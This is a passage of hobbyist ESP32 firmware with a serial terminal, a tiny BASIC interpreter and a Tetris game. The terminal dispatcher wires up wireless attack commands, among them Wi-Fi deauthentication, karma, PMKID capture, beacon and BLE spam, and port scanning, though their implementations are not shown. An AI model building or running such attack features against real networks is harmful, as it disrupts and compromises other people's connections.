  if (strcasecmp(cmd,"crash")==0){tOutPush("Crashing...");tFlushOut();tDrawOutput();delay(600);*(volatile int*)0=0;return true;}
  if (strcasecmp(cmd,"echo")==0){char buf[TERM_LINE_W+1];if(a1[0]&&a2[0])snprintf(buf,sizeof(buf),"%s %s",a1,a2);else if(a1[0])snprintf(buf,sizeof(buf),"%s",a1);else snprintf(buf,sizeof(buf),"(empty)");tOutPush(buf);tFlushOut();return true;}
  if (strcasecmp(cmd,"history")==0){tOutPushf("History %d:",tCmdHistCount);for(int i=0;i<tCmdHistCount;i++)tOutPush(tCmdHist[i]);tFlushOut();return true;}
  if (strcasecmp(cmd,"gpio")==0){tCmdGpio(a1,a2,a3);tFlushOut();return true;}
  if (strcasecmp(cmd,"temp")==0){tOutPushf("Temp: %.1f C",temperatureRead());tFlushOut();return true;}
  if (strcasecmp(cmd,"i2c")==0){tCmdI2c(a1);tFlushOut();return true;}
  if (strcasecmp(cmd,"subghz")==0){tOutPush("SubGHz: no HW");tOutPush("Need CC1101");tFlushOut();return true;}
  if (strcasecmp(cmd,"ls")==0){tCmdLs();tFlushOut();return true;}
  if (strcasecmp(cmd,"df")==0){tCmdDf();tFlushOut();return true;}
  if (strcasecmp(cmd,"cat")==0){tCmdCat(a1);tFlushOut();return true;}
  if (strcasecmp(cmd,"rm")==0){tCmdRm(a1);tFlushOut();return true;}
  if (strcasecmp(cmd,"write")==0){tCmdWrite(a1,a2);tFlushOut();return true;}
  if (strcasecmp(cmd,"log")==0){tCmdLogInfo();tFlushOut();return true;}
  if (strcasecmp(cmd,"clearlog")==0){tCmdClearLog();tFlushOut();return true;}
  if (strcasecmp(cmd,"hacklog")==0){tCmdHackLog();tFlushOut();return true;}
  if (strcasecmp(cmd,"md5")==0){tCmdMd5(a1);tFlushOut();return true;}
  if (strcasecmp(cmd,"rand")==0){tCmdRand(a1);tFlushOut();return true;}
  if (strcasecmp(cmd,"sleep")==0){tCmdSleep(a1);tFlushOut();return true;}
  if (strcasecmp(cmd,"adc")==0){tCmdAdc(a1);tFlushOut();return true;}
  if (strcasecmp(cmd,"pwm")==0){tCmdPwm(a1,a2,a3);tFlushOut();return true;}
  if (strcasecmp(cmd,"tone")==0){tCmdTone(a1,a2,a3);tFlushOut();return true;}
  if (strcasecmp(cmd,"nvs")==0){if(strcasecmp(a1,"get")==0&&a2[0]){int addr=atoi(a2);if(addr<0||addr>=1024){tOutPush("0-1023");tFlushOut();return true;}tOutPushf("Addr %d = %d",addr,EEPROM.read(addr));}else tOutPush("nvs get <addr>");tFlushOut();return true;}
  if (strcasecmp(cmd,"wifi")==0){
    if (strcasecmp(a1,"scan")==0){tCmdWifiScan();tFlushOut();return true;}
    else if (strcasecmp(a1,"ip")==0){tCmdWifiIp();tFlushOut();return true;}
    else if (strcasecmp(a1,"status")==0){tCmdWifiStatus();tFlushOut();return true;}
    else if (strcasecmp(a1,"deauth")==0){tCmdWifiDeauth(a2);tFlushOut();return true;}
    else if (strcasecmp(a1,"probe")==0){tCmdWifiProbe();tFlushOut();return true;}
    else if (strcasecmp(a1,"beacon")==0){tCmdWifiBeacon();tFlushOut();return true;}
    else if (strcasecmp(a1,"chan")==0){tCmdWifiChan();tFlushOut();return true;}
    else if (strcasecmp(a1,"sniff")==0){tCmdWifiSniff(a2);tFlushOut();return true;}
    else if (strcasecmp(a1,"karma")==0){tCmdWifiKarma(a2);tFlushOut();return true;}
    else if (strcasecmp(a1,"pmkid")==0){tCmdWifiPmkid(a2);tFlushOut();return true;}
    else if (strcasecmp(a1,"sniffraw")==0){tCmdWifiSniffRaw(a2);tFlushOut();return true;}
    else if (strcasecmp(a1,"connect")==0){tCmdWifiConnect(a2,a3);tFlushOut();return true;}
    else if (strcasecmp(a1,"disconnect")==0){tCmdWifiDisconnect();tFlushOut();return true;}
    else {tOutPush("wifi scan|ip|status");tOutPush("wifi sniff|probe|beacon");tOutPush("wifi chan|deauth|karma");tOutPush("wifi pmkid|sniffraw");tOutPush("wifi connect <s> <p>");tFlushOut();return true;}
  }
  if (strcasecmp(cmd,"ping")==0){tCmdPing(a1);tFlushOut();return true;}
  if (strcasecmp(cmd,"nslookup")==0){tCmdNslookup(a1);tFlushOut();return true;}
  if (strcasecmp(cmd,"portscan")==0){tCmdPortscan(a1);tFlushOut();return true;}
  if (strcasecmp(cmd,"http")==0){tCmdHttp(a1);tFlushOut();return true;}
  if (strcasecmp(cmd,"ble")==0){
    if (strcasecmp(a1,"scan")==0){tCmdBleScan();tFlushOut();return true;}
    else if (strcasecmp(a1,"track")==0){tCmdBleTrack();tFlushOut();return true;}
    else if (strcasecmp(a1,"spam")==0){tCmdBleSpam(a2);tFlushOut();return true;}
    tOutPush("ble scan|track|spam");tFlushOut();return true;
  }
  if (strcmp(cmd,"!!")==0 && tCmdHistCount>0){strncpy(tInput,tCmdHist[tCmdHistCount-1],TERM_BUF_MAX);tInputLen=strlen(tInput);return tExecLocal();}
  if (cmd[0]=='!' && cmd[1]>='0' && cmd[1]<='9'){int idx=atoi(cmd+1);if(idx>=0&&idx<tCmdHistCount){strncpy(tInput,tCmdHist[idx],TERM_BUF_MAX);tInputLen=strlen(tInput);return tExecLocal();}}
  return false;
}
// ★ 终端键盘模式：单击 RIGHT → 直接退出；长按 RIGHT → 连删；双击 RIGHT → 也退出
bool tKeyboardMode() {
  tDrawFull();
  unsigned long lastBlink = 0;
  while (true) {
    char k = kbGetKey();
    if (k == 'L') kbMoveCursor(-1);
    else if (k == 'R') kbMoveCursor(+1);
    else if (k == 'E') {
      char ch = kbCellChar(g_kbPos / KB_COLS, g_kbPos % KB_COLS);
      if (ch == KB_KEY_SHIFT) { g_kbPage = (g_kbPage + 1) % 4; kbDrawFull(); }
      else if (ch == KB_KEY_ENTER) {
        if (!tExecLocal()) Serial.println(tInput);
        tInputLen = 0; tInput[0] = 0;
        tDrawOutput(); tDrawInputLine();
      } else if (tInputLen < TERM_BUF_MAX) {
        tInput[tInputLen++] = ch;
        tInput[tInputLen] = 0;
        tDrawInputLine();
      }
    }
    else if (k == 'D') { if (tInputLen > 0) { tInput[--tInputLen] = 0; tDrawInputLine(); } }
    else if (k == 'K' || k == 'X') return true;
    if (millis() - lastBlink > 500) { lastBlink = millis(); tDrawInputLine(); }
    delay(15);
  }
}
void tBrowseMode() {
  while (true) {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Terminal", 2, 0);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R:kb  R2x:exit", 96, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    int show = (tHistCount < 7) ? tHistCount : 7;
    int start = tHistCount - show;
    for (int i = 0; i < show; i++) tft.drawString(tHist[start + i], 2, 12 + i * 9);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString("Lines:" + String(tHistCount), 2, 74);
    static unsigned long lastLeft = 0, lastRight = 0;
    if (digitalRead(BTN_LEFT) == LOW) {
      delay(20);
      if (digitalRead(BTN_LEFT) == LOW) {
        while (digitalRead(BTN_LEFT) == LOW) delay(5);
        unsigned long now = millis();
        if (lastLeft > 0 && now - lastLeft < 500) { lastLeft = 0; tViewMode(); continue; }
        lastLeft = now;
        bool exitFlag = tKeyboardMode();
        if (exitFlag) return;
        continue;
      }
    }
    if (digitalRead(BTN_RIGHT) == LOW) {
      delay(20);
      if (digitalRead(BTN_RIGHT) == LOW) {
        while (digitalRead(BTN_RIGHT) == LOW) delay(5);
        unsigned long now = millis();
        if (lastRight > 0 && now - lastRight < 500) { lastRight = 0; return; }
        lastRight = now;
        bool exitFlag = tKeyboardMode();
        if (exitFlag) return;
        continue;
      }
    }
    if (digitalRead(BTN_UP) == LOW) { delay(20); while (digitalRead(BTN_UP) == LOW) delay(5); tViewMode(); continue; }
    delay(20);
  }
}
void showTerminal() {
  deinitWifi(); deinitBLE();
  tClearHist();
  g_kbPos = 0; g_kbPage = 0; g_kbCaps = false;
  tPushLine("Cake Terminal v5");
  tPushLine("Type 'help' for cmds");
  tPushLine("R:kb  R2x:exit");
  tBrowseMode();
}

// ==================================================
// ============== BASIC 编程器 ==============
// ==================================================
#define BSC_MAX_LINES  30
#define BSC_LINE_W     40
#define BSC_VIS_ROWS   6
#define BSC_FILE       "/basic.bas"
struct BscLine { int num; char code[BSC_LINE_W + 1]; };
BscLine bscProg[BSC_MAX_LINES];
int  bscLineCount = 0;
int  bscCursor = -1;
char bscEditBuf[BSC_LINE_W + 1];
int  bscEditLen = 0;

void bscEnsureFile() {
  ensureLittleFS();
  if (LittleFS.exists(BSC_FILE)) {
    File f = LittleFS.open(BSC_FILE, "r");
    if (f) {
      String firstLine = "";
      while (f.available() && firstLine.length() == 0) { firstLine = f.readStringUntil('\n'); firstLine.trim(); }
      f.close();
      const char* p = firstLine.c_str();
      while (*p == ' ') p++;
      int n = 0; while (*p >= '0' && *p <= '9') { n = n*10 + (*p - '0'); p++; }
      if (n == 10) LittleFS.remove(BSC_FILE);
    }
  }
  if (!LittleFS.exists(BSC_FILE)) { File f = LittleFS.open(BSC_FILE, "w"); if (f) f.close(); }
}
void bscSaveFile() {
  ensureLittleFS();
  File f = LittleFS.open(BSC_FILE, "w");
  if (!f) return;
  for (int i = 0; i < bscLineCount; i++) { f.print(bscProg[i].num); f.print(" "); f.println(bscProg[i].code); }
  f.close();
}
void bscLoadFile() {
  ensureLittleFS();
  bscLineCount = 0; bscCursor = -1;
  File f = LittleFS.open(BSC_FILE, "r");
  if (!f) return;
  while (f.available()) {
    String line = f.readStringUntil('\n'); line.trim();
    if (line.length() == 0) continue;
    const char* p = line.c_str(); while (*p == ' ') p++;
    if (*p < '0' || *p > '9') continue;
    int n = 0; while (*p >= '0' && *p <= '9') { n = n * 10 + (*p - '0'); p++; }
    while (*p == ' ') p++;
    if (bscLineCount < BSC_MAX_LINES && n > 0) {
      bscProg[bscLineCount].num = n;
      strncpy(bscProg[bscLineCount].code, p, BSC_LINE_W);
      bscProg[bscLineCount].code[BSC_LINE_W] = 0;
      bscLineCount++;
    }
  }
  f.close();
  for (int i = 0; i < bscLineCount - 1; i++)
    for (int j = i + 1; j < bscLineCount; j++)
      if (bscProg[j].num < bscProg[i].num) { BscLine t = bscProg[i]; bscProg[i] = bscProg[j]; bscProg[j] = t; }
}
void bscDeleteFile() { ensureLittleFS(); if (LittleFS.exists(BSC_FILE)) LittleFS.remove(BSC_FILE); bscLineCount = 0; bscCursor = -1; bscEnsureFile(); }
int bscFindLine(int num) { for (int i = 0; i < bscLineCount; i++) if (bscProg[i].num == num) return i; return -1; }
void bscAddLine(const char* code, int lineNum) {
  if (lineNum <= 0) lineNum = (bscLineCount > 0) ? bscProg[bscLineCount-1].num + 1 : 1;
  int idx = bscFindLine(lineNum);
  if (idx >= 0) { strncpy(bscProg[idx].code, code, BSC_LINE_W); bscProg[idx].code[BSC_LINE_W] = 0; return; }
  if (bscLineCount >= BSC_MAX_LINES) return;
  bscProg[bscLineCount].num = lineNum;
  strncpy(bscProg[bscLineCount].code, code, BSC_LINE_W);
  bscProg[bscLineCount].code[BSC_LINE_W] = 0;
  bscLineCount++;
  for (int i = 0; i < bscLineCount - 1; i++)
    for (int j = i + 1; j < bscLineCount; j++)
      if (bscProg[j].num < bscProg[i].num) { BscLine t = bscProg[i]; bscProg[i] = bscProg[j]; bscProg[j] = t; }
}
void bscDelLine(int idx) { if (idx < 0 || idx >= bscLineCount) return; for (int i = idx; i < bscLineCount - 1; i++) bscProg[i] = bscProg[i + 1]; bscLineCount--; bscSaveFile(); }
void bscDrawBrowse() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("BASIC", 2, 0);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R:kb R2x:exit", 100, 0);
  bool selMenu = (bscCursor == -1);
  int y0 = 11;
  if (selMenu) tft.fillRect(0, y0 - 1, 160, 10, 0x0010);
  tft.setTextColor(selMenu ? TFT_YELLOW : TFT_CYAN, selMenu ? 0x0010 : TFT_BLACK);
  tft.drawString(String(selMenu ? "> " : "  ") + "[MENU]", 2, y0);
  int start = 0;
  if (bscCursor >= BSC_VIS_ROWS) start = bscCursor - BSC_VIS_ROWS + 1;
  if (start < 0) start = 0;
  for (int i = 0; i < BSC_VIS_ROWS; i++) {
    int idx = start + i; if (idx >= bscLineCount) break;
    int y = 21 + i * 9; bool sel = (bscCursor == idx);
    if (sel) tft.fillRect(0, y - 1, 160, 9, 0x0010);
    tft.setTextColor(sel ? TFT_YELLOW : TFT_WHITE, sel ? 0x0010 : TFT_BLACK);
    char buf[44]; snprintf(buf, sizeof(buf), "%d %s", bscProg[idx].num, bscProg[idx].code);
    if (strlen(buf) > 26) buf[26] = 0;
    tft.drawString(String(sel ? "> " : "  ") + buf, 2, y);
  }
  if (bscLineCount == 0) { tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("  (empty - press R)", 2, 21); }
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
  char st[24]; snprintf(st, sizeof(st), "L:%d", bscLineCount);
  tft.drawString(st, 138, 74);
}
// ★ BASIC 键盘模式：单击 RIGHT → 直接退出；长按 RIGHT → 连删；双击 RIGHT → 也退出
bool bscKeyboardMode() {
  if (bscCursor >= 0 && bscCursor < bscLineCount) {
    strncpy(bscEditBuf, bscProg[bscCursor].code, BSC_LINE_W);
    bscEditBuf[BSC_LINE_W] = 0;
  } else { bscEditBuf[0] = 0; }
  bscEditLen = strlen(bscEditBuf);
  g_kbPos = 0; g_kbPage = 0; g_kbCaps = false;
  unsigned long lastBlink = 0;
  while (true) {
    tft.fillScreen(TFT_BLACK);
    tft.fillRect(0, 0, 160, 10, TFT_DARKGREY);
    tft.setTextColor(TFT_WHITE, TFT_DARKGREY); tft.drawString("[MENU]", 2, 1);
    tft.setTextColor(TFT_CYAN,  TFT_DARKGREY); tft.drawString("R:close L:ok", 76, 1);
    int lineNum = (bscCursor >= 0 && bscCursor < bscLineCount)
                    ? bscProg[bscCursor].num
                    : ((bscLineCount > 0) ? bscProg[bscLineCount-1].num + 1 : 1);
    char lbuf[8]; snprintf(lbuf, sizeof(lbuf), "%d", lineNum);
    int lbw = strlen(lbuf) * 6;
    tft.fillRect(0, 10, 160, 12, TFT_NAVY);
    tft.setTextColor(TFT_GREEN, TFT_NAVY); tft.drawString(lbuf, 2, 12);
    tft.drawFastVLine(4 + lbw, 11, 10, TFT_DARKGREY);
    int xStart = 8 + lbw;
    int maxVis = (158 - xStart) / 6; if (maxVis < 1) maxVis = 1;
    int startIdx = (bscEditLen > maxVis) ? bscEditLen - maxVis : 0;
    int visLen = bscEditLen - startIdx; if (visLen > maxVis) visLen = maxVis;
    tft.setTextColor(TFT_YELLOW, TFT_NAVY);
    if (visLen > 0) { char vis[32]; memcpy(vis, bscEditBuf + startIdx, visLen); vis[visLen] = 0; tft.drawString(vis, xStart, 12); }
    int cx = xStart + visLen * 6;
    if (((millis()/500)&1) == 0 && cx < 154) tft.fillRect(cx, 12, 6, 8, TFT_YELLOW);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    char hdr[32]; snprintf(hdr, sizeof(hdr), "Cur:%d Total:%d", bscCursor, bscLineCount);
    tft.drawString(hdr, 2, 24);
    kbDrawFull();
    char k = kbGetKey();
    if (k == 'L') kbMoveCursor(-1);
    else if (k == 'R') kbMoveCursor(+1);
    else if (k == 'E') {
      char ch = kbCellChar(g_kbPos / KB_COLS, g_kbPos % KB_COLS);
      if (ch == KB_KEY_SHIFT) { g_kbPage = (g_kbPage + 1) % 4; kbDrawFull(); }
      else if (ch == KB_KEY_ENTER) {
        bscAddLine(bscEditBuf, lineNum);
        bscSaveFile();
        int idx = bscFindLine(lineNum);
        if (idx >= 0 && idx + 1 < bscLineCount) {
          bscCursor = idx + 1;
          strncpy(bscEditBuf, bscProg[bscCursor].code, BSC_LINE_W);
          bscEditBuf[BSC_LINE_W] = 0;
          bscEditLen = strlen(bscEditBuf);
        } else { bscCursor = -1; bscEditBuf[0] = 0; bscEditLen = 0; }
      } else if (bscEditLen < BSC_LINE_W) {
        bscEditBuf[bscEditLen++] = ch;
        bscEditBuf[bscEditLen] = 0;
      }
    }
    else if (k == 'D') { if (bscEditLen > 0) bscEditBuf[--bscEditLen] = 0; }
    else if (k == 'K' || k == 'X') { if (bscEditLen > 0) bscAddLine(bscEditBuf, lineNum); bscSaveFile(); return true; }
    if (millis() - lastBlink > 500) lastBlink = millis();
    delay(15);
  }
}
int bscBrowseLoop() {
  unsigned long lastUD = 0, lastR = 0, lastL = 0;
  while (true) {
    bscDrawBrowse();
    if (digitalRead(BTN_UP) == LOW && millis()-lastUD > 160) {
      lastUD = millis(); while (digitalRead(BTN_UP)==LOW) delay(5);
      if (bscCursor > -1) { if (bscCursor == 0) bscCursor = -1; else bscCursor--; }
    }
    if (digitalRead(BTN_DOWN) == LOW && millis()-lastUD > 160) {
      lastUD = millis(); while (digitalRead(BTN_DOWN)==LOW) delay(5);
      if (bscCursor == -1) bscCursor = 0; else if (bscCursor < bscLineCount-1) bscCursor++;
    }
    if (digitalRead(BTN_RIGHT) == LOW) {
      delay(20); if (digitalRead(BTN_RIGHT)==LOW) {
        while (digitalRead(BTN_RIGHT)==LOW) delay(5);
        unsigned long now = millis();
        if (now - lastR < 500) return 2;
        lastR = now;
        return 1;
      }
    }
    if (digitalRead(BTN_LEFT) == LOW) {
      delay(20); if (digitalRead(BTN_LEFT)==LOW) {
        while (digitalRead(BTN_LEFT)==LOW) delay(5);
        unsigned long now = millis();
        if (now - lastL < 500) { lastL = 0; return 1; }
        lastL = now;
        if (bscCursor == -1) return 3;
        return 1;
      }
    }
    delay(20);
  }
}
void bscDrawMenu(int sel) {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("BASIC MENU", 80, 4, 1);
  const char* items[] = {"New","Save","Load","Delete","Run","Exit"};
  for (int i=0;i<6;i++){int y=18+i*9;tft.setTextColor((i==sel)?TFT_YELLOW:TFT_WHITE,TFT_BLACK);tft.drawString(String((i==sel)?"> ":"  ")+items[i],2,y);}
}
int bscMenuLoop() {
  int sel = 0;
  while (true) { bscDrawMenu(sel); char k = getKey();
    if (k=='U') sel=(sel+5)%6; else if (k=='D') sel=(sel+1)%6;
    else if (k=='L') return sel; else if (k=='R'||k=='E') return 5;
    delay(30); }
}
void bscShowMessage(const char* title, const char* body, unsigned long ms) {
  clearAll(); tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawCentreString(title,80,20,1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawCentreString(body,80,42,1); delay(ms);
}
int bscVars[26];
int bscGetVar(char c) { if (c >= 'A' && c <= 'Z') return bscVars[c - 'A']; if (c >= 'a' && c <= 'z') return bscVars[c - 'a']; return 0; }
void bscSetVar(char c, int v) { if (c >= 'A' && c <= 'Z') bscVars[c - 'A'] = v; else if (c >= 'a' && c <= 'z') bscVars[c - 'a'] = v; }
const char* bscExprP;
int bscParseExpr();
int bscParsePrimary() {
  while (*bscExprP == ' ') bscExprP++;
  if (*bscExprP == '(') { bscExprP++; int v = bscParseExpr(); if (*bscExprP == ')') bscExprP++; return v; }
  if (*bscExprP == '-') { bscExprP++; return -bscParsePrimary(); }
  if ((*bscExprP >= 'A' && *bscExprP <= 'Z') || (*bscExprP >= 'a' && *bscExprP <= 'z')) { int v = bscGetVar(*bscExprP); bscExprP++; return v; }
  int v = 0; bool got = false;
  while (*bscExprP >= '0' && *bscExprP <= '9') { v = v*10 + (*bscExprP - '0'); bscExprP++; got = true; }
  if (!got) return 0;
  return v;
}
int bscParseMul() {
  int v = bscParsePrimary();
  while (true) {
    while (*bscExprP == ' ') bscExprP++;
    if (*bscExprP == '*') { bscExprP++; v *= bscParsePrimary(); }
    else if (*bscExprP == '/') { bscExprP++; int d = bscParsePrimary(); if (d == 0) d = 1; v /= d; }
    else if (*bscExprP == '%') { bscExprP++; int d = bscParsePrimary(); if (d == 0) d = 1; v %= d; }
    else break;
  }
  return v;
}
int bscParseExpr() {
  int v = bscParseMul();
  while (true) {
    while (*bscExprP == ' ') bscExprP++;
    if (*bscExprP == '+') { bscExprP++; v += bscParseMul(); }
    else if (*bscExprP == '-') { bscExprP++; v -= bscParseMul(); }
    else break;
  }
  return v;
}
int bscEval(const char* s) { bscExprP = s; return bscParseExpr(); }
void bscRunLine(const char* code) {
  const char* p = code; while (*p == ' ') p++;
  if ((p[0]=='P'||p[0]=='p') && strncasecmp(p, "PRINT", 5)==0) {
    p += 5; while (*p == ' ') p++;
    if (*p == '"') { p++; char buf[32]; int n = 0; while (*p && *p != '"' && n < 31) buf[n++] = *p++; buf[n] = 0;
      clearAll(); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString(buf, 2, 30); delay(400); return; }
    int v = bscEval(p);
    clearAll(); tft.setTextColor(TFT_GREEN, TFT_BLACK);
    char buf[20]; snprintf(buf, sizeof(buf), "%d", v);
    tft.drawString(buf, 2, 30); delay(400); return;
  }
  if ((p[0]=='L'||p[0]=='l') && strncasecmp(p, "LET", 3)==0) { p += 3; while (*p==' ') p++; }
  if ((*p >= 'A' && *p <= 'Z') || (*p >= 'a' && *p <= 'z')) {
    char var = *p++; while (*p == ' ') p++;
    if (*p == '=') { p++; int v = bscEval(p); bscSetVar(var, v); return; }
  }
  if ((p[0]=='C'||p[0]=='c') && strncasecmp(p, "CLS", 3)==0) { clearAll(); }
}
void bscRun() {
  if (bscLineCount == 0) { bscShowMessage("Run", "Empty program", 800); return; }
  for (int i = 0; i < 26; i++) bscVars[i] = 0;
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Running...", 2, 0);
  delay(400);
  for (int i = 0; i < bscLineCount; i++) bscRunLine(bscProg[i].code);
  clearAll();
  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawCentreString("Done", 80, 30, 1);
  delay(800);
}
void showBasic() {
  deinitWifi(); deinitBLE();
  bscEnsureFile(); bscLoadFile();
  bscCursor = -1;
  while (true) {
    int r = bscBrowseLoop();
    if (r == 1) { bool exitFlag = bscKeyboardMode(); if (exitFlag) { bscSaveFile(); return; } continue; }
    if (r == 2) { bscSaveFile(); return; }
    if (r == 3) {
      int act = bscMenuLoop();
      switch (act) {
        case 0: bscDeleteFile(); bscShowMessage("New File","Cleared",600); break;
        case 1: bscSaveFile(); bscShowMessage("Save","Saved",600); break;
        case 2: bscLoadFile(); bscShowMessage("Load","Loaded",600); break;
        case 3: bscDeleteFile(); bscShowMessage("Delete","Deleted",600); break;
        case 4: bscRun(); break;
        case 5: bscSaveFile(); return;
      }
      bscCursor = -1;
    }
  }
}

// ==================================================
// ============== Tetris ==============
// ==================================================
int tetrisGrid[20][10];
int pieceX, pieceY, pieceType, pieceRot;
const int TET_X = 30, TET_Y = 10, TET_CELL_W = 5, TET_CELL_H = 3;
const int pieces[7][4][4] = {
  {{1,1,1,1},{0,0,0,0},{0,0,0,0},{0,0,0,0}},
  {{1,1,1,0},{1,0,0,0},{0,0,0,0},{0,0,0,0}},
  {{1,1,1,0},{0,0,1,0},{0,0,0,0},{0,0,0,0}},
  {{1,1,0,0},{1,1,0,0},{0,0,0,0},{0,0,0,0}},
  {{0,1,1,0},{1,1,0,0},{0,0,0,0},{0,0,0,0}},
  {{1,1,0,0},{0,1,1,0},{0,0,0,0},{0,0,0,0}},
  {{1,1,1,0},{0,1,0,0},{0,0,0,0},{0,0,0,0}}
};
bool getShapeCell(int type, int rot, int row, int col) {
  int r = row, c = col;
  for (int k = 0; k < rot; k++) { int t = r; r = 3 - c; c = t; }
  if (r < 0 || r > 3 || c < 0 || c > 3) return false;
  return pieces[type][r][c] != 0;
}
void tetrisInit() { for (int y = 0; y < 20; y++) for (int x = 0; x < 10; x++) tetrisGrid[y][x] = 0; pieceType = random(7); pieceRot = 0; pieceX = 3; pieceY = 0; }
bool tetrisCollide(int x, int y, int rot) {
  for (int i = 0; i < 4; i++) for (int j = 0; j < 4; j++)
    if (getShapeCell(pieceType, rot, i, j)) { int gx = x + j, gy = y + i; if (gx < 0 || gx >= 10 || gy >= 20) return true; if (gy >= 0 && tetrisGrid[gy][gx]) return true; }
  return false;
}
bool tryRotate() {
  int newRot = (pieceRot + 1) % 4;
  int offsets[5]; int oc = 0;
  if (pieceType == 0) {
    if (pieceRot == 0) { offsets[oc++]=2; offsets[oc++]=1; offsets[oc++]=-1; offsets[oc++]=-2; offsets[oc++]=0; }
    else if (pieceRot == 1) { offsets[oc++]=-2; offsets[oc++]=-1; offsets[oc++]=1; offsets[oc++]=2; offsets[oc++]=0; }
    else if (pieceRot == 2) { offsets[oc++]=-2; offsets[oc++]=-1; offsets[oc++]=1; offsets[oc++]=2; offsets[oc++]=0; }
    else { offsets[oc++]=2; offsets[oc++]=1; offsets[oc++]=-1; offsets[oc++]=-2; offsets[oc++]=0; }
  } else { offsets[oc++]=0; offsets[oc++]=-1; offsets[oc++]=1; offsets[oc++]=-2; offsets[oc++]=2; }
  for (int i = 0; i < oc; i++) if (!tetrisCollide(pieceX + offsets[i], pieceY, newRot)) { pieceX += offsets[i]; pieceRot = newRot; return true; }
  return false;
}
void tetrisDrawFrameColor(uint16_t color) {
  int bx = TET_X - 3, by = TET_Y - 3, bw = 10 * TET_CELL_W + 6, bh = 20 * TET_CELL_H + 6;
  tft.drawRoundRect(bx, by, bw, bh, 4, TFT_WHITE);
  tft.drawRoundRect(bx + 1, by + 1, bw - 2, bh - 2, 4, TFT_DARKGREY);
}
void tetrisDrawColor(uint16_t blockColor) {
  tft.fillRect(TET_X, TET_Y, 10 * TET_CELL_W, 20 * TET_CELL_H, TFT_BLACK);
  for (int y = 0; y < 20; y++) for (int x = 0; x < 10; x++) if (tetrisGrid[y][x]) tft.fillRect(TET_X + x * TET_CELL_W, TET_Y + y * TET_CELL_H, TET_CELL_W, TET_CELL_H, blockColor);
  for (int i = 0; i < 4; i++) for (int j = 0; j < 4; j++) if (getShapeCell(pieceType, pieceRot, i, j)) tft.fillRect(TET_X + (pieceX + j) * TET_CELL_W, TET_Y + (pieceY + i) * TET_CELL_H, TET_CELL_W, TET_CELL_H, blockColor);
  tetrisDrawFrameColor(blockColor);
}
void tetrisClear() {
  for (int y = 19; y >= 0; y--) {
    bool full = true;
    for (int x = 0; x < 10; x++) if (!tetrisGrid[y][x]) { full = false; break; }
    if (full) { for (int yy = y; yy > 0; yy--) for (int x = 0; x < 10; x++) tetrisGrid[yy][x] = tetrisGrid[yy - 1][x]; for (int x = 0; x < 10; x++) tetrisGrid[0][x] = 0; y++; }
  }
}
void tetShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Best Score:", 4, 24); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(tetData.bestScore), 4, 38);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Best Lines:", 4, 54); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(tetData.bestLines), 4, 68);
  waitExit();
}
void tetShowShop() {
  int sel = 0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Shop", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 120, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    for (int i = 0; i < TET_SKIN_COUNT; i++) {
      int y = 14 + i * 11;
      bool owned = (tetData.ownedSkins >> i) & 1; bool current = (tetData.currentSkin == i);
      String line = ((i == sel) ? "> " : "  ") + String(TET_SKINS[i].name);
      if (current) line += " *"; else if (!owned) line += " $" + String(TET_SKINS[i].cost); else line += " (owned)";
      tft.setTextColor(i == sel ? TFT_YELLOW : TET_SKINS[i].color, TFT_BLACK);
      tft.drawString(line, 2, y);
    }
    char k = getKey();
    if (k == 'U') sel = (sel + TET_SKIN_COUNT - 1) % TET_SKIN_COUNT;
    else if (k == 'D') sel = (sel + 1) % TET_SKIN_COUNT;
    else if (k == 'L') {
      bool owned = (tetData.ownedSkins >> sel) & 1;
      if (owned) { tetData.currentSkin = sel; tetSave(); }
      else if (pet2.coins >= TET_SKINS[sel].cost) { pet2.coins -= TET_SKINS[sel].cost; tetData.ownedSkins |= (1 << sel); tetData.currentSkin = sel; pet2Save(); tetSave(); }
    } else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}
void tetGamePlay() {
  clearAll();
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Tetris", 2, 0);
  uint16_t blockColor = TET_SKINS[tetData.currentSkin].color;
  int score = 0, lines = 0;
  tetrisInit(); tetrisDrawFrameColor(blockColor);
  unsigned long lastFall = millis(); int fallSpeed = 500;
  while (true) {
    char k = getTetrisKey();
    if (k == 'U') { if (!tetrisCollide(pieceX - 1, pieceY, pieceRot)) pieceX--; }
    else if (k == 'D') { if (!tetrisCollide(pieceX + 1, pieceY, pieceRot)) pieceX++; }
    else if (k == 'L') tryRotate();
    else if (k == 'R') { while (!tetrisCollide(pieceX, pieceY + 1, pieceRot)) pieceY++; }
    else if (k == 'E') { if (score > tetData.bestScore) tetData.bestScore = score; if (lines > tetData.bestLines) tetData.bestLines = lines; tetSave(); if (score > 0) gameReward(score / 30 + 2); pet2TaskAdd(6, 1); return; }
    if (millis() - lastFall > (unsigned long)fallSpeed) {
      lastFall = millis();
